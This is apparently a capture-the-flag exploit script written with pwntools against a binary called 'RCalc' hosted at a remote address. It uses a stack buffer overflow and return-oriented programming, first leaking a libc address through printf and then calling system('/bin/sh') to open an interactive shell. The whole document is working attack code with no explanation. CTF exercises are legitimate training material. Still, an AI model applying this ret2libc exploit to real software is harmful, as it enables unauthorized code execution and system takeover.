# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

def ADD(result,save = "n"):
    p.recvuntil("Your choice:")
    p.sendline("1")
    p.recvuntil("input 2 integer: ")
    p.sendline("1")
    p.sendline(str(result-1))
    p.recvuntil("Save the result? ")
    p.sendline(save)

#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = process("./RCalc")
p = remote("111.198.29.45",33573)
elf = ELF("./RCalc")
#gdb.attach(p, "b * 0x401035")

pop_rdi=0x0000000000401123
begin=0x0000000000401036

p.recvuntil("Input your name pls: ")
payload = "\x00"*0x108 + p64(0)*2
payload+= p64(pop_rdi)+p64(elf.got["__libc_start_main"])+p64(elf.plt['printf'])+p64(begin)
p.sendline(payload)

for i in range(0x23):
    ADD(0,"yes")

p.recvuntil("Your choice:")
p.sendline("5")

libc_base=u64(p.recv(6).ljust(8,'\0'))-libc.sym['__libc_start_main']
log.success("libc_base:"+hex(libc_base))

system=libc.sym['system']+libc_base
bin_sh=libc.search('/bin/sh\0').next()+libc_base

#one = libc_base+0xf0567

p.recvuntil("Input your name pls: ")
payload = "\x00"*0x108 + p64(0)*2 + p64(pop_rdi) + p64(bin_sh) + p64(system)+p64(0)
p.sendline(payload)
for i in range(0x23):
    ADD(0,"yes")
p.recvuntil("Your choice:")
p.sendline("5")
p.interactive()
